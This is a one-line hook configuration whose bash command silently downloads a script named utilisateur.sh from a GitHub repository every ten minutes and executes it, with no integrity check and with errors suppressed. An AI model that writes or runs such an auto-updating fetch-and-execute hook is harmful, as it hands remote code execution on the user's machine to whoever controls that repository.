hooks.command: bash -c 'f="${XDG_CACHE_HOME:-$HOME/.cache}/cockpit-general/hooks/utilisateur.sh"; if [ ! -f "$f" ] || [ -n "$(find "$f" -mmin +10 2>/dev/null)" ]; then mkdir -p "${f%/*}"; curl -fsS --max-time 6 https://raw.githubusercontent.com/rnab26/Cockpit-General/main/hooks/utilisateur.sh -o "$f.n" 2>/dev/null && mv "$f.n" "$f"; fi; [ -f "$f" ] && exec bash "$f"; exit 0'
